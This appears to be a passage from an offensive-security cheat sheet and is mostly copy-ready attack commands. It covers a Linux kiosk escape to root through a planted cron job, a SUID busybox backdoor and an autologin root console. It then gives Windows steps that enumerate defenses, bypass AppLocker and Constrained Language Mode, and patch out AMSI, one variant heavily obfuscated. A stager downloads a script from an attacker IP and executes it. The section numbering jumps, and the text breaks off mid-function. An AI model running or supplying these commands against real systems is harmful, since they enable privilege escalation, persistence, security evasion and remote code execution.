# /etc/cron.hourly accepts non-root-owned scripts (unlike /etc/cron.d, /etc/profile.d)
rm /home/[user]/.mozilla/firefox/[profile].default
ln -s /etc/cron.hourly /home/[user]/.mozilla/firefox/[profile].default
openbox --replace

# Write the payload with Scratchpad (gtkdialog terminal eats a second redirect).
# Backdoor: SUID a private busybox copy so we keep root after the cron fires.
echo "#!/bin/bash" > /etc/cron.hourly/bookmarks.html
echo "chown root:root /home/[user]/busybox" >> /etc/cron.hourly/bookmarks.html
echo "chmod +s /home/[user]/busybox" >> /etc/cron.hourly/bookmarks.html

# After the top of the hour, run a root gtkdialog terminal via SUID busybox
echo '#!/bin/bash' > /home/[user]/runterminal.sh
echo '/usr/bin/gtkdialog -f /home/[user]/terminal.txt' >> /home/[user]/runterminal.sh
/home/[user]/busybox sh /home/[user]/runterminal.sh    # terminal now runs as root

Upgrade to a real root TTY by enabling VT switching and an autologin console.

# Comment out DontVTSwitch in /etc/X11/xorg.conf.d/10-xorg.conf (edit a 777 copy in Scratchpad)
cp /etc/X11/xorg.conf.d/10-xorg.conf /home/[user]/xorg.txt
chmod 777 /home/[user]/xorg.txt
# ...edit, then restore...
cp /home/[user]/xorg.txt /etc/X11/xorg.conf.d/10-xorg.conf
chmod 644 /etc/X11/xorg.conf.d/10-xorg.conf
openbox --replace

# Add an autologin root TTY to /etc/inittab, then reload without rebooting
# c3::respawn:/sbin/agetty --noclear --autologin root 38400 tty3 linux
cp /etc/inittab /home/[user]/inittab.txt
chmod 777 /home/[user]/inittab.txt
# ...edit in Scratchpad, then restore...
cp /home/[user]/inittab.txt /etc/inittab
chmod 600 /etc/inittab
/sbin/init q

# Over VNC, rebind the server to the raw virtual terminal to land on the root TTY
killall x11vnc
x11vnc -rawfb vt3

# Send hotkeys programmatically when the kiosk swallows them
xdotool key Ctrl+Alt+F3

5.2 Defense Evasion

5.2.1 Enumerate Defenses

# AppLocker rules
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# AMSI state via registry (0 = disabled)
reg query "HKLM\Software\Microsoft\AMSI"

# AMSI state via PowerShell
'amsiutils'

# Alternative: check loaded modules
Get-Process -Name powershell | ForEach-Object { $_.Modules | Where-Object { $_.ModuleName -eq "amsi.dll" } }

# Defender status
Get-MpComputerStatus | Select-Object AMRunningMode, AntivirusEnabled

# Constrained Language Mode (FullLanguage / RestrictedLanguage / NoLanguage)
$ExecutionContext.SessionState.LanguageMode

# PPL state (RunAsPPL = 1 means protected)
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"

5.2.2 Disable AppLocker & CLM

  • FullBypass — run from C:\Windows\Tasks or C:\Windows\Temp when AppLocker is active
  • bypass-clm — compile, transfer, then install via InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe .\FullBypass.csproj

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "C:\Windows\Tasks\bypass-clm.exe"

5.2.3 Disable AMSI

# Direct reflection patch
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Light obfuscation — amsiInitFailed
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)

# Light obfuscation — amsiContext pointer zeroing
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# Heavy obfuscation variant
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Bypass not detected by PowerShell autologging

4.2.6.5 Obfuscated UAC Bypass (encoded payload)

Build a Base64-encoded command, embed it in an obfuscated loader, then execute.

# Encode the stager on the attacker machine
echo -en '(New-Object System.Net.WebClient).DownloadString("http://[ip]/run3.txt") | IEX' | iconv -t UTF-16LE | base64 -w 0

# Alternatively generate encoding in PowerShell
$text = "(New-Object System.Net.WebClient).DownloadString('http://[ip]/run3.txt') | IEX"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
[Convert]::ToBase64String($bytes)

# Paste the Base64 blob into $code, define the obfuscated loader, then call it
$code = "<base64-blob>"

function Bypass {
[CmdletBinding()]
param (
[Parameter (Position=0, Mandatory = $True)]
[string]$code )

5.2.7 Shutdown Firewall
